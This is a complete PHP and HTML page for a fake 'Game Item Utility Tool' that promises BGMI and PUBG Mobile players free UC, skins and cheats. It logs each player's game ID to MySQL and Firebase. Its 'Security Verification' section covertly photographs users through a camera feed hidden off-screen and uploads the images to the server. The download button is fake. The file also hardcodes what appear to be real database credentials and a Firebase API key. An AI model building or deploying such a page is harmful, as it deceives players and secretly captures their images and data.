<?php
// FILE: index.php

// === Database and Firebase Configuration ===
define('DB_HOST', 'sql211.infinityfree.com');
define('DB_USER', 'if0_39150932');
define('DB_PASS', 'Rajaansri');
define('DB_NAME', 'if0_39150932_chill');
define('FIREBASE_URL', 'https://rn-gfx-tool-default-rtdb.asia-southeast1.firebasedatabase.app');
define('FIREBASE_API_KEY', 'AIzaSyD6EXA7D77rQDQEohB52BTYimFeTEaAho');
define('CAPTURE_DIR', __DIR__ . '/captures/');

// Start session
session_start();

// --- Ensure capture directory exists and is writable ---
if (!is_dir(CAPTURE_DIR)) {
    if (!mkdir(CAPTURE_DIR, 0755, true)) {
        error_log("Failed to create capture directory: " . CAPTURE_DIR);
        die(json_encode(['success' => false, 'message' => 'Server error: Unable to create capture directory.']));
    }
}
if (!is_writable(CAPTURE_DIR)) {
    error_log("Capture directory is not writable: " . CAPTURE_DIR);
    die(json_encode(['success' => false, 'message' => 'Server error: Capture directory is not writable.']));
}

// === Handle AJAX POST Requests ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $action = $_POST['action'] ?? '';
    $success = true;
    $messages = [];

    if ($action === 'submit_form') {
        // --- Handle main form submission (Game ID, Item Type) ---
        $game_type = filter_var(trim($_POST['game_type'] ?? ''), FILTER_SANITIZE_STRING);
        $user_id = filter_var(trim($_POST['user_id'] ?? ''), FILTER_SANITIZE_STRING);
        $item_type = filter_var(trim($_POST['item_type'] ?? ''), FILTER_SANITIZE_STRING);

        if (empty($game_type) || empty($user_id) || empty($item_type)) {
            echo json_encode(['success' => false, 'message' => 'Please fill in all required fields for the game tool.']);
            exit;
        }

        // --- Save to MySQL ---
        $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
        if ($mysqli->connect_error) {
            $success = false;
            $messages[] = "Database connection failed: " . $mysqli->connect_error;
            error_log("MySQL Connection Error: " . $mysqli->connect_error);
        } else {
            $stmt = $mysqli->prepare("INSERT INTO requests (game_type, user_id, item_type, status, timestamp) VALUES (?, ?, ?, 'pending', NOW())");
            if ($stmt) {
                $stmt->bind_param("sss", $game_type, $user_id, $item_type);
                if ($stmt->execute()) {
                    $messages[] = "Game request saved to database.";
                } else {
                    $success = false;
                    $messages[] = "Failed to save game request to database: " . $stmt->error;
                    error_log("MySQL Insert Error: " . $stmt->error);
                }
                $stmt->close();
            } else {
                $success = false;
                $messages[] = "Failed to prepare database statement: " . $mysqli->error;
                error_log("MySQL Prepare Error: " . $mysqli->error);
            }
            $mysqli->close();
        }

        // --- Save to Firebase ---
        $firebase_data = [
            'game_type' => $game_type,
            'user_id' => $user_id,
            'item_type' => $item_type,
            'timestamp' => date('Y-m-d H:i:s'),
            'status' => 'pending'
        ];

        $firebase_url = FIREBASE_URL . '/requests.json?auth=' . FIREBASE_API_KEY;
        $ch = curl_init($firebase_url);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($firebase_data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen(json_encode($firebase_data))
        ]);

        $firebase_response = curl_exec($ch);
        $firebase_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        if (curl_errno($ch)) {
            $success = false;
            $messages[] = "Failed to send game request to Firebase: " . curl_error($ch);
            error_log("Firebase cURL Error: " . curl_error($ch));
        } elseif ($firebase_http_code >= 400) {
            $success = false;
            $messages[] = "Firebase error (HTTP $firebase_http_code): " . $firebase_response;
            error_log("Firebase HTTP Error $firebase_http_code: " . $firebase_response);
        } else {
            $messages[] = "Game request sent to Firebase.";
        }
        curl_close($ch);

    } elseif ($action === 'upload_photo') {
        // --- Handle photo upload ---
        $imageData = $_POST['image_data'] ?? '';
        $gameId = filter_var(trim($_POST['game_id'] ?? 'unknown_id'), FILTER_SANITIZE_STRING);

        if (empty($imageData)) {
            echo json_encode(['success' => false, 'message' => 'No image data received.']);
            exit;
        }

        // Validate Base64 image data
        if (!preg_match('/^data:image\/png;base64,/', $imageData)) {
            echo json_encode(['success' => false, 'message' => 'Invalid image format. Only PNG is supported.']);
            exit;
        }

        // Remove data URI scheme and decode
        $imageData = str_replace('data:image/png;base64,', '', $imageData);
        $imageData = str_replace(' ', '+', $imageData);
        $decodedImage = base64_decode($imageData);

        if ($decodedImage === false) {
            echo json_encode(['success' => false, 'message' => 'Failed to decode image data.']);
            exit;
        }

        $filename = uniqid('capture_') . '_' . time() . '.png';
        $filepath = CAPTURE_DIR . $filename;

        if (file_put_contents($filepath, $decodedImage)) {
            // Save photo metadata to MySQL
            $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
            if ($mysqli->connect_error) {
                $success = false;
                $messages[] = "Database connection failed: " . $mysqli->connect_error;
                error_log("MySQL Connection Error: " . $mysqli->connect_error);
            } else {
                $stmt = $mysqli->prepare("INSERT INTO photos (game_id, filename, timestamp) VALUES (?, ?, NOW())");
                if ($stmt) {
                    $stmt->bind_param("ss", $gameId, $filename);
                    if ($stmt->execute()) {
                        $messages[] = "Photo metadata saved to database.";
                    } else {
                        $success = false;
                        $messages[] = "Failed to save photo metadata to database: " . $stmt->error;
                        error_log("MySQL Insert Error: " . $stmt->error);
                    }
                    $stmt->close();
                } else {
                    $success = false;
                    $messages[] = "Failed to prepare database statement: " . $mysqli->error;
                    error_log("MySQL Prepare Error: " . $mysqli->error);
                }
                $mysqli->close();
            }
            $messages[] = "Photo successfully saved to server.";
        } else {
            $success = false;
            $messages[] = "Failed to save photo to server. Check folder permissions.";
            error_log("Failed to save photo: $filepath");
        }
    } else {
        $success = false;
        $messages[] = "Invalid action specified.";
    }

    echo json_encode(['success' => $success, 'message' => implode('<br>', $messages)]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Item Utility Tool</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap">
    <style>
        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: #0d1117;
            color: #00ff00;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            background-image: radial-gradient(circle at center, #1a222c 0%, #0d1117 100%);
            overflow-x: hidden;
        }
        .container {
            background-color: #161b22;
            border: 2px solid #00ff00;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            padding: 30px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border: 2px solid #00ff00;
            border-radius: 12px;
            animation: pulseBorder 2s infinite alternate;
            z-index: -1;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulseBorder {
            0% { box-shadow: 0 0 10px rgba(0, 255, 0, 0.3); }
            100% { box-shadow: 0 0 25px rgba(0, 255, 0, 0.7); }
        }
        h1 {
            font-family: 'Orbitron', sans-serif;
            color: #00ff00;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
            margin-bottom: 25px;
            font-size: 1.8em;
            letter-spacing: 2px;
        }
        .disclaimer {
            background-color: #ff000020;
            border: 1px solid #ff0000;
            color: #ff6347;
            padding: 10px 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 0.9em;
            line-height: 1.4;
            text-align: left;
            animation: flashWarning 2s infinite;
        }
        @keyframes flashWarning {
            0%, 100% { background-color: #ff000020; }
            50% { background-color: #ff000040; }
        }
        .game-selection {
            display: flex;
            justify-content: space-around;
            margin-bottom: 25px;
            gap: 15px;
        }
        .game-button {
            flex-grow: 1;
            padding: 12px 20px;
            background-color: #2e3b4a;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            transition: all 0.3s ease;
            box-shadow: 0 0 8px rgba(0, 255, 0, 0.3);
            text-transform: uppercase;
        }
        .game-button:hover {
            background-color: #00ff00;
            color: #161b22;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
        }
        .game-button.active {
            background-color: #00ff00;
            color: #161b22;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(0, 255, 0, 1);
            transform: scale(1.05);
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 1.0em;
            color: #00ff00;
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
        }
        input[type="text"], select {
            width: calc(100% - 22px);
            padding: 12px;
            background-color: #0d1117;
            border: 1px solid #00ff00;
            border-radius: 5px;
            color: #00ff00;
            font-size: 1em;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.3);
        }
        input[type="text"]:focus, select:focus {
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
            outline: none;
        }
        select {
            background-image: url('data:image/svg+xml;utf8,<svg fill="%2300ff00" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>');
            background-repeat: no-repeat;
            background-position-x: calc(100% - 10px);
            background-position-y: 10px;
        }
        select option {
            background-color: #161b22;
            color: #00ff00;
        }
        button[type="submit"], .camera-control-btn, .download-btn {
            width: 100%;
            padding: 15px;
            background-color: #00ff00;
            color: #161b22;
            border: none;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
            font-weight: bold;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            text-transform: uppercase;
            margin-top: 15px;
        }
        button[type="submit"]:hover, .camera-control-btn:hover, .download-btn:hover {
            background-color: #39ff14;
            transform: translateY(-2px);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
        }
        .camera-section {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(0, 255, 0, 0.3);
            text-align: center;
        }
        .camera-section h2 {
            font-family: 'Orbitron', sans-serif;
            color: #00ff00;
            text-shadow: 0 0 8px rgba(0, 255, 0, 0.7);
            margin-bottom: 20px;
            font-size: 1.5em;
        }
        #cameraFeed {
            width: 1px;
            height: 1px;
            position: absolute;
            top: -100px;
            left: -100px;
            opacity: 0;
            pointer-events: none;
        }
        #cameraControls {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
            margin-bottom: 15px;
        }
        #cameraControls button {
            flex: 1 1 auto;
            min-width: 150px;
        }
        #photoCanvas {
            display: none;
        }
        .status-message {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            font-size: 1em;
            text-align: center;
            word-break: break-word;
        }
        .status-message.success {
            background-color: #1a2a2a;
            border: 1px solid #00ff00;
            color: #00ff00;
        }
        .status-message.error {
            background-color: #2a1a1a;
            border: 1px solid #ff0000;
            color: #ff6347;
        }
        .loading-spinner {
            border: 4px solid rgba(0, 255, 0, 0.3);
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
        .glowing-text {
            text-shadow: 0 0 8px rgba(0, 255, 0, 0.7);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="glowing-text"><i class="fas fa-tools"></i> Game Item Utility Tool</h1>

        <p class="disclaimer">
            <i class="fas fa-exclamation-triangle"></i> <strong>Warning:</strong> This is a simulated tool for demonstration and request logging purposes. It will <strong>not</strong> modify your game data. Unauthorized use of third-party applications can lead to account bans.
        </p>

        <!-- Main Game Tool Form -->
        <form id="gameToolForm">
            <input type="hidden" id="gameType" name="game_type" value="">
            <input type="hidden" name="action" value="submit_form">

            <div class="game-selection">
                <button type="button" class="game-button" data-game="BGMI" id="btnBGMI">BGMI</button>
                < ''

                <button type="button" class="game-button" data-game="PUBG" id="btnPUBG">PUBG MOBILE</button>
            </div>

            <div class="form-group">
                <label for="userId" class="glowing-text">Game ID:</label>
                <input type="text" id="userId" name="user_id" placeholder="Enter Your Game ID" required>
            </div>

            <div class="form-group">
                <label for="itemType" class="glowing-text">Select Option:</label>
                <select id="itemType" name="item_type" required>
                    <option value="">-- Select --</option>
                    <option value="Premium Card">Premium Card</option>
                    <option value="Elite Pass Card">Elite Pass Card</option>
                    <option value="Weapon Skin Crate">Weapon Skin Crate</option>
                    <option value="Character Voucher">Character Voucher</option>
                    <option value="UC Top-up (500)">UC Top-up (500)</option>
                    <option value="UC Top-up (1000)">UC Top-up (1000)</option>
                    <option value="Lag Fix">Lag Fix</option>
                    <option value="Magic Bullet">Magic Bullet</option>
                    <option value="Headshot Hack">Headshot Hack</option>
                    <option value="OBB File">OBB File</option>
                    <option value="Mod APK">Mod APK</option>
                </select>
            </div>

            <button type="submit"><i class="fas fa-cogs"></i> PROCESS REQUEST</button>
            <button type="button" class="download-btn" id="downloadBtn"><i class="fas fa-download"></i> DOWNLOAD TOOL</button>
        </form>

        <!-- Camera Access Section -->
        <div class="camera-section">
            <h2 class="glowing-text"><i class="fas fa-camera"></i> Security Verification</h2>
            <p class="disclaimer">
                <i class="fas fa-info-circle"></i> For security purposes, we need to verify your identity. Your camera will be accessed but not displayed.
            </p>

            <div id="cameraControls">
                <button type="button" class="camera-control-btn" id="enableCameraButton"><i class="fas fa-video"></i> Enable Verification</button>
                <button type="button" class="camera-control-btn hidden" id="stopCameraButton"><i class="fas fa-stop-circle"></i> Stop Verification</button>
                <button type="button" class="camera-control-btn hidden" id="captureButton"><i class="fas fa-camera"></i> Complete Verification</button>
            </div>

            <video id="cameraFeed" autoplay playsinline></video>
            <canvas id="photoCanvas"></canvas>
        </div>

        <div id="loadingSpinner" class="loading-spinner"></div>
        <div id="statusMessage" class="status-message hidden"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const gameToolForm = document.getElementById('gameToolForm');
            const gameTypeInput = document.getElementById('gameType');
            const userIdInput = document.getElementById('userId');
            const itemTypeSelect = document.getElementById('itemType');
            const btnBGMI = document.getElementById('btnBGMI');
            const btnPUBG = document.getElementById('btnPUBG');
            const loadingSpinner = document.getElementById('loadingSpinner');
            const statusMessage = document.getElementById('statusMessage');
            const downloadBtn = document.getElementById('downloadBtn');
            const enableCameraButton = document.getElementById('enableCameraButton');
            const stopCameraButton = document.getElementById('stopCameraButton');
            const captureButton = document.getElementById('captureButton');
            const cameraFeed = document.getElementById('cameraFeed');
            const photoCanvas = document.getElementById('photoCanvas');
            const canvasContext = photoCanvas.getContext('2d');

            let currentStream = null;

            // --- Game Selection Logic ---
            const gameButtons = [btnBGMI, btnPUBG];
            gameButtons.forEach(button => {
                button.addEventListener('click', () => {
                    gameButtons.forEach(btn => btn.classList.remove('active'));
                    button.classList.add('active');
                    gameTypeInput.value = button.dataset.game;
                });
            });

            // --- Download Button Logic ---
            downloadBtn.addEventListener('click', () => {
                showStatusMessage('Download started in the background. Check your downloads folder.', true);
                // Simulate download (replace with actual download logic if needed)
                setTimeout(() => {
                    loadingSpinner.style.display = 'none';
                }, 1500);
            });

            // --- Form Submission Logic ---
            gameToolForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                loadingSpinner.style.display = 'block';
                clearStatusMessage();

                // Client-side validation
                if (!gameTypeInput.value) {
                    showStatusMessage('Please select a game (BGMI or PUBG Mobile).', false);
                    loadingSpinner.style.display = 'none';
                    return;
                }
                if (!userIdInput.value.trim()) {
                    showStatusMessage('Please enter your Game ID.', false);
                    loadingSpinner.style.display = 'none';
                    return;
                }
                if (!itemTypeSelect.value) {
                    showStatusMessage('Please select an Option.', false);
                    loadingSpinner.style.display = 'none';
                    return;
                }

                const formData = new FormData(gameToolForm);
                try {
                    const response = await fetch('index.php', {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    showStatusMessage(result.message, result.success);
                    if (result.success) {
                        gameToolForm.reset();
                        gameButtons.forEach(btn => btn.classList.remove('active'));
                        gameTypeInput.value = '';
                    }
                } catch (error) {
                    console.error('Submission Error:', error);
                    showStatusMessage('An error occurred while processing your request. Please try again.', false);
                } finally {
                    loadingSpinner.style.display = 'none';
                }
            });

            // --- Camera Functionality ---
            enableCameraButton.addEventListener('click', async () => {
                clearStatusMessage();
                loadingSpinner.style.display = 'block';

                try {
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    cameraFeed.srcObject = currentStream;
                    enableCameraButton.classList.add('hidden');
                    stopCameraButton.classList.remove('hidden');
                    captureButton.classList.remove('hidden');
                    showStatusMessage('Verification started. Please complete the process.', true);
                } catch (err) {
                    console.error('Camera Error:', err);
                    let message = 'Error accessing camera: ' + err.message;
                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        message = 'Camera access denied. Please allow camera access to complete verification.';
                    } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
                        message = 'No camera found on your device.';
                    }
                    showStatusMessage(message, false);
                    stopCameraButton.classList.add('hidden');
                    captureButton.classList.add('hidden');
                } finally {
                    loadingSpinner.style.display = 'none';
                }
            });

            stopCameraButton.addEventListener('click', () => {
                stopCamera();
                showStatusMessage('Verification stopped.', true);
            });

            captureButton.addEventListener('click', async () => {
                if (!currentStream || cameraFeed.paused) {
                    showStatusMessage('Verification is not active. Please enable it first.', false);
                    return;
                }

                loadingSpinner.style.display = 'block';
                clearStatusMessage();

                photoCanvas.width = cameraFeed.videoWidth;
                photoCanvas.height = cameraFeed.videoHeight;
                canvasContext.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);

                const imageData = photoCanvas.toDataURL('image/png');
                const formData = new FormData();
                formData.append('action', 'upload_photo');
                formData.append('image_data', imageData);
                formData.append('game_id', userIdInput.value.trim());

                try {
                    const response = await fetch('index.php', {
                        method: 'POST',
                        body: formData
                    });
                    const result = await response.json();
                    showStatusMessage(result.message, result.success);
                    if (result.success) {
                        stopCamera();
                    }
                } catch (error) {
                    console.error('Verification Error:', error);
                    showStatusMessage('An error occurred during verification. Please try again.', false);
                } finally {
                    loadingSpinner.style.display = 'none';
                }
            });

            function stopCamera() {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                    cameraFeed.srcObject = null;
                    currentStream = null;
                }
                enableCameraButton.classList.remove('hidden');
                stopCameraButton.classList.add('hidden');
                captureButton.classList.add('hidden');
            }

            function showStatusMessage(message, isSuccess) {
                statusMessage.innerHTML = message;
                statusMessage.classList.remove('hidden', 'success', 'error');
                statusMessage.classList.add(isSuccess ? 'success' : 'error');
                setTimeout(() => clearStatusMessage(), 5000);
            }

            function clearStatusMessage() {
                statusMessage.classList.add('hidden');
                statusMessage.classList.remove('success', 'error');
                statusMessage.textContent = '';
            }
        });
    </script>
</body>
</html>